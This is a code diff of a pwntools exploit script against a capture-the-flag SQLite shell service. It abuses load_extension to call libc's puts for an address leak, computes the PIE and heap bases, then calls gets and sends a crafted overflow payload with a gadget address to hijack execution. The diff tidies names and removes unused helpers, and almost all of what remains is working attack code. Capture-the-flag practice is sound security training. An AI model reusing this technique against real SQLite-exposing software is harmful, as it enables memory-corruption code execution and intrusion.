@@ -106,29 +106,20 @@ context.log_level='debug'
 p = remote("notabug2.nc.jctf.pro",1337)
 
 ru         = lambda a:     p.readuntil(a)
-r         = lambda n:        p.read(n)
 sla     = lambda a,b:     p.sendlineafter(a,b)
-sa         = lambda a,b:     p.sendafter(a,b)
-sl        = lambda a:     p.sendline(a)
-s         = lambda a:     p.send(a)
-
-
 
 sla(b"lite>",b"select Load_extension('/lib/x86_64-linux-gnu/libc.so.6','puts');")
 ru(": \n")
-lic = u64(p.recvn(6).ljust(8,b'\x00'))
-warning(hex(lic))
-pie_base = lic - 0x1589a0
-
+PIE = u64(p.recvn(6).ljust(8,b'\x00'))
+warning(hex(PIE))
+pie_base = PIE - 0x1589a0
 heap = 0x00005555556b0000-0x0000555555554000+pie_base # 1/0x2000
-
-heap1 = 0x1150 + heap
-heap2 = 0x103c0 + heap
-# system_plt = (pie_base+0x2228C)
 system_plt = pie_base + 0x10910
+
 if pie_base > 0x600000000000:
     p.close()
-warning(hex(pie_base)) #lic+0x28b8
+
+warning(hex(pie_base))
 sla(b"lite>",b"select Load_extension('/lib/x86_64-linux-gnu/libc.so.6','gets');")
 p.sendline(p64(heap+0x11eb0)+b'a'*0x8+p64(pie_base+0x000000000009e0ad))
 # raw_input()
